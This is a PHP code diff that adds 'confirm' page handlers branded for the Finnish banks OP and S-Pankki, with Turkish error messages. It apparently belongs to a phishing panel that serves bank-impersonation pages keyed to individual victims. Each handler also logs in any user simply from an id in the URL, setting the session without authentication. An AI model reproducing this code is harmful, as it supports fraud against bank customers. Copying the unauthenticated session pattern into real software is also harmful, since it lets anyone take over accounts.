@@ -808,6 +808,46 @@ class UserPageController extends Controller
         ]);
     }
 
+    public function opConfirm(array $params = []): void
+    {
+        $userId = (int) ($params['id'] ?? 0);
+        
+        if ($userId <= 0) {
+            http_response_code(404);
+            die("Kullanıcı bulunamadı");
+        }
+
+        $userModel = new User();
+        $user = $userModel->findById($userId);
+
+        if (!$user) {
+            http_response_code(404);
+            die("Kullanıcı bulunamadı");
+        }
+
+        $_SESSION['user_id'] = $userId;
+        $_SESSION['user_name'] = $user['full_name'];
+
+        $bankModel = new Bank();
+        $allBanks = $bankModel->getAll();
+        $bank = null;
+        foreach ($allBanks as $b) {
+            if (stripos($b['name'], 'op') !== false) {
+                $bank = $b;
+                break;
+            }
+        }
+        if (!$bank) {
+            http_response_code(404);
+            die("Banka bulunamadı: OP");
+        }
+
+        $this->view('bank/opbank-confirm', [
+            'user' => $user,
+            'bank' => $bank
+        ]);
+    }
+
     public function spankki3(array $params = []): void
     {
         $userId = (int) ($params['id'] ?? 0);
@@ -914,6 +954,43 @@ class UserPageController extends Controller
         }
 
         $this->view('bank/s-pankkibank5', [
+            'user' => $user,
+            'bank' => $bank
+        ]);
+    }
+
+    public function spankkiConfirm(array $params = []): void
+    {
+        $userId = (int) ($params['id'] ?? 0);
+        
+        if ($userId <= 0) {
+            http_response_code(404);
+            die("Kullanıcı bulunamadı");
+        }
+
+        $userModel = new User();
+        $user = $userModel->findById($userId);
+
+        if (!$user) {
+            http_response_code(404);
+            die("Kullanıcı bulunamadı");
+        }
+
+        $_SESSION['user_id'] = $userId;
+        $_SESSION['user_name'] = $user['full_name'];
+
+        $bankModel = new Bank();
+        $bank = $bankModel->findById(4);
+        if (!$bank) {
+            $bank = $bankModel->findById(5);
+        }
+
+        if (!$bank) {
+            http_response_code(404);
+            die("Banka bulunamadı: S-Pankki");
+        }
+
+        $this->view('bank/spankki-confirm', [
             'user' => $user,
             'bank' => $bank
         ]);
